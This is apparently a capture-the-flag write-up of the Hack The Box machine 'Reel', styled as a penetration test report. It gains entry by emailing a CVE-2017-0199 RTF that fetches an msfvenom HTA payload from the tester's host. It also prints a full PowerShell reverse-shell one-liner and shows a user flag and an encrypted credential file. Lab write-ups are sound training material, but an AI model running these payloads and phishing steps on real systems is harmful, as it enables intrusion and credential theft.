# Reel

## Penetration Test Report

### Introduction

The penetration test report contains all efforts that were conducted during client engagement. The purpose of this report is to ensure that the client has a full understanding of penetration testing methodologies as well as the technical knowledge to remediate any security flaws.

### Objective

The objective of this assessment is to perform an internal penetration test against the network. The student is tasked with following methodical approach in obtaining full control of the network. This test should simulate an attacker and how an attacker would start from beginning to end.

### Requirements

The pentester will be required to fill out this penetration testing report fully and to include the following sections:

* Overall High-Level Summary and Recommendations (non-technical)
* Methodology walkthrough and detailed outline of steps taken
* Each finding with included screenshots, walkthrough, sample code, and root.txt if applicable
* Any additional items that were not included

## High-Level Summary

I was tasked with performing an internal penetration test towards the client network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate internal systems. My overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to the client.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on client's network. When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations. During the testing, I had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below:

* 10.129.15.19 (Reel) - Microsoft Office/WordPad Remote Code Execution Vulnerability CVE-2017-0199

### Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

## Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the environments is secured. Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

### Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, I was tasked with exploiting the client network. The specific IP addresses were:

**Network**

* 10.129.15.0/24

### Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, I was able to successfully gain access to _all_ systems.

#### System IP: 10.129.15.19

#### **Service Enumeration**

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

| Server IP Address | Ports Open                              |
| ----------------- | --------------------------------------- |
| 10.129.15.19      | **TCP**: 21,22,25,135,139,445,593,49159 |
|                   | **UDP**:                                |

**Nmap Scan Results:**

```
┌──[Mon Nov  7 10:04:26 PM CST 2022]-[TheScriptKid]-[/home/pentester]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# rscan $ip      
rustscan --accessible -u 5000 -b 2500 -a 10.129.15.19 -- -Pn -A

Automatically increasing ulimit value to 5000.
Open 10.129.15.19:21
Open 10.129.15.19:22
Open 10.129.15.19:25
Open 10.129.15.19:135
Open 10.129.15.19:139
Open 10.129.15.19:445
Open 10.129.15.19:593
Open 10.129.15.19:49159
Starting Script(s)
Running script "nmap -vvv -p {{port}} {{ip}} -Pn -A" on ip 10.129.15.19
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-07 22:05 CST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:05
Completed Parallel DNS resolution of 1 host. at 22:05, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:05
Scanning 10.129.15.19 [8 ports]
Discovered open port 21/tcp on 10.129.15.19
Discovered open port 445/tcp on 10.129.15.19
Discovered open port 135/tcp on 10.129.15.19
Discovered open port 25/tcp on 10.129.15.19
Discovered open port 139/tcp on 10.129.15.19
Discovered open port 22/tcp on 10.129.15.19
Discovered open port 593/tcp on 10.129.15.19
Discovered open port 49159/tcp on 10.129.15.19
Completed SYN Stealth Scan at 22:05, 0.24s elapsed (8 total ports)
Initiating Service scan at 22:05
Scanning 8 services on 10.129.15.19
Completed Service scan at 22:08, 168.40s elapsed (8 services on 1 host)
Initiating OS detection (try #1) against 10.129.15.19
Retrying OS detection (try #2) against 10.129.15.19
Initiating Traceroute at 22:08
Completed Traceroute at 22:08, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 22:08
Completed Parallel DNS resolution of 2 hosts. at 22:08, 0.01s elapsed
DNS resolution of 2 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.129.15.19.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:08
NSE: [ftp-bounce 10.129.15.19:21] PORT response: 501 Server cannot accept argument.
NSE Timing: About 99.91% done; ETC: 22:08 (0:00:00 remaining)
Completed NSE at 22:08, 40.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:08
Completed NSE at 22:08, 2.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Nmap scan report for 10.129.15.19
Host is up, received user-set (0.15s latency).
Scanned at 2022-11-07 22:05:11 CST for 216s

PORT      STATE SERVICE      REASON          VERSION
21/tcp    open  ftp          syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-28-18  11:19PM       <DIR>          documents
22/tcp    open  ssh          syn-ack ttl 127 OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQkehAZGj87mZluxFiVu+GPAAnC/OQ9QKUF2wlIwvefrD2L4zWyGXlAgSbUq/MqujR/efrTIjPYWK+5Mlxc7gEoZBylGAPbdxFivL8YQs3dQPt6aHNF0v+ABS01L2qZ4ewd1sTi1TlT6LtWHehX2PBJ6S3LWG09v+E/3ue97y9gaOjfA6BCMWgQ7K3yvQeHrRpBSk/vQxfCh4TINwV3EGbGTfbs8VvvR+Et7weB5EOifgXfHbyh04KemONkceFSAnjRRYOgwvtXai9imsDJ8KtS2RMR197VK4MBhsY7+h0nOvUMgm76RcRc6N8GW1mn6gWp98Ds9VeymzAmQvprs97
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAw2CYanDlTRpGqzVXrfGTcAYVe/vUnnkWicQPzdfix5gFsv4nOGNUM+Fko7QAW0jqCFQKc8anGAwJjFGLTB00k=
|   256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICdDfn+n5xueGtHP20/aPkI8pvCfxb2UZA3RQdqnpjBk
25/tcp    open  smtp?        syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.92%I=7%D=11/7%Time=6369D57D%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20
SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero
SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai
SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re
SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")
SF:%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindRe
SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Ma
SF:il\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n5
SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of
SF:\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc
SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\
SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2
SF:0commands\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=11/7%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6369D64F%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=7)
OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11%O4=M53ANW8ST11%O5=M53ANW8ST11%O6=M53AST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M53ANW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.004 days (since Mon Nov  7 22:03:06 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24484/tcp): CLEAN (Timeout)
|   Check 2 (port 37999/tcp): CLEAN (Timeout)
|   Check 3 (port 61170/udp): CLEAN (Timeout)
|   Check 4 (port 14280/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-11-08T04:08:10
|_  start_date: 2022-11-08T04:03:24
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2022-11-08T04:08:07+00:00

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   114.23 ms 10.10.16.1
2   167.77 ms 10.129.15.19

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 216.79 seconds
           Raw packets sent: 92 (7.756KB) | Rcvd: 38 (2.392KB)
```

_Initial Shell -_ Microsoft Office/WordPad Remote Code Execution Vulnerability (_CVE_-2017-0199)

**Vulnerability Explanation:**

Microsoft Office 2007 SP3, Microsoft Office 2010 SP2, Microsoft Office 2013 SP1, Microsoft Office 2016, Microsoft Windows Vista SP2, Windows Server 2008 SP2, Windows 7 SP1, Windows 8.1 allow remote attackers to execute arbitrary code via a crafted document, aka "Microsoft Office/WordPad Remote Code Execution Vulnerability w/Windows API."

**Vulnerability Fix:**&#x20;

Update to the latest software release

**Severity:** **Critical**

**Proof of Concept:**

I see ftp allows anonymous logins and can see that there are files of interest

```
┌──[Mon Nov  7 11:47:25 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# ftp $ip                                      
Connected to 10.129.15.19.
220 Microsoft FTP Service
Name (10.129.15.19:pentester): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> binary
200 Type set to I.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
```

I proceed to download the readme.txt file and the word document

```
ftp> get readme.txt
local: readme.txt remote: readme.txt
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |*********************************************************************************************************************|   124        2.04 KiB/s    00:00 ETA
226 Transfer complete.
124 bytes received in 00:00 (1.02 KiB/s)
ftp> get "Windows Event Forwarding.docx"
local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |*********************************************************************************************************************| 14581       51.00 KiB/s    00:00 ETA
226 Transfer complete.
14581 bytes received in 00:00 (41.55 KiB/s)
```

Reading the readme file indicates that a user is reading word documents which also indicates for a potential phishing attack

```
┌──[Mon Nov  7 11:53:54 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# cat readme.txt 
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

Furthermore, reading the output from using exiftool on the word document reveals user/email address

```
┌──[Tue Nov  8 12:02:28 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# exiftool Windows\ Event\ Forwarding.docx 
ExifTool Version Number         : 12.42
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2017:10:31 16:13:23-05:00
File Access Date/Time           : 2022:11:07 23:48:32-06:00
File Inode Change Date/Time     : 2022:11:07 23:48:32-06:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : 
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
```

With this information I proceed to utilize the [CVE-2017-0199 Exploit toolkit ](https://github.com/bhdresh/CVE-2017-0199)by creating the HTA and RTF payloads

```
┌──[Mon Nov  7 11:56:53 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# msfvenom -p windows/shell_reverse_tcp LHOST=$tun0 LPORT=443 -f hta-psh -o thescriptkid.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 7368 bytes
Saved as: thescriptkid.hta
                                                                                                                                                                  
┌──[Mon Nov  7 11:58:24 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# python2 /opt/CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -t RTF -w DNS.RTF -u http://$tun0/thescriptkid.hta
Generating normal RTF payload.

Generated DNS.RTF successfully
```

Starting the webserver and netcat listener

```
┌──[Tue Nov  8 12:01:01 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# python3 -m http.server 80                                                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

┌──[Tue Nov  8 12:02:37 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

Sending our malicious email and gaining initial foothold

```
┌──[Tue Nov  8 12:03:42 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# sendEmail -f thescriptkid@megabank.com -t nico@megabank.com -u "Subject" -m "Message" -a DNS.RTF -s $ip -v
Nov 08 00:10:00 localhost sendEmail[729161]: DEBUG => Connecting to 10.129.15.19:25
Nov 08 00:10:00 localhost sendEmail[729161]: DEBUG => My IP address is: 10.10.16.2
Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	220 Mail Service ready
Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	EHLO localhost
Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	MAIL FROM:<thescriptkid@megabank.com>
Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	250 OK
Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	RCPT TO:<nico@megabank.com>
Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	250 OK
Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	DATA
Nov 08 00:10:01 localhost sendEmail[729161]: SUCCESS => Received: 	354 OK, send.
Nov 08 00:10:01 localhost sendEmail[729161]: INFO => Sending message body
Nov 08 00:10:01 localhost sendEmail[729161]: Setting content-type: text/plain
Nov 08 00:10:01 localhost sendEmail[729161]: DEBUG => Sending the attachment [DNS.RTF]
Nov 08 00:10:13 localhost sendEmail[729161]: SUCCESS => Received: 	250 Queued (12.281 seconds)
Nov 08 00:10:13 localhost sendEmail[729161]: Email was sent successfully!  From: <thescriptkid@megabank.com> To: <nico@megabank.com> Subject: [Subject] Attachment(s): [DNS.RTF] Server: [10.129.15.19:25]

```

```
┌──[Tue Nov  8 12:01:01 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# python3 -m http.server 80                                                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.15.19 - - [08/Nov/2022 00:10:22] "GET /thescriptkid.hta HTTP/1.1" 200 -

```

```
┌──[Tue Nov  8 12:02:37 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.15.19.
Ncat: Connection from 10.129.15.19:50048.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**Local.txt Proof Screenshot**

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>user proof</p></figcaption></figure>

**Local.txt Contents**

```
C:\Users\nico\Desktop>hostname && whoami && type user.txt && ipconfig /all
hostname && whoami && type user.txt && ipconfig /all
REEL
htb\nico
fa363aebcfa2c29897a69af385fee971
Windows IP Configuration

   Host Name . . . . . . . . . . . . : REEL
   Primary Dns Suffix  . . . . . . . : HTB.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : HTB.LOCAL
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-E7-88
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::17d(Preferred) 
   Lease Obtained. . . . . . . . . . : 08 November 2022 04:03:15
   Lease Expires . . . . . . . . . . : 08 November 2022 07:33:15
   IPv6 Address. . . . . . . . . . . : dead:beef::38b5:a806:d0b6:bce2(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::38b5:a806:d0b6:bce2%14(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.15.19(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : 08 November 2022 04:03:27
   Lease Expires . . . . . . . . . . : 08 November 2022 07:33:27
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%14
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 335564886
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-AD-9E-CA-00-50-56-B9-50-75
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

C:\Users\nico\Desktop>
```

**Privilege Escalation**

_Additional Priv Esc info_

_Upgrading to powershell and catching the new shell_

{% code overflow="wrap" %}
```
C:\Users\nico\Desktop>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',53);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',53);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
{% endcode %}

```
┌──[Tue Nov  8 06:34:32 PM CST 2022]-[TheScriptKid]-[/home/pentester]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: ]
└──# nc -lnvp 53 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.129.15.19.
Ncat: Connection from 10.129.15.19:57585.
```

Listing the files in nico's desktop shows a file of interest

```
PS C:\Users\nico\Desktop> ls


    Directory: C:\Users\nico\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-ar--        28/10/2017     00:59       1468 cred.xml                                                                  
-ar--        28/10/2017     00:40         32 user.txt                                                                  


PS C:\Users\nico\Desktop> cat cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

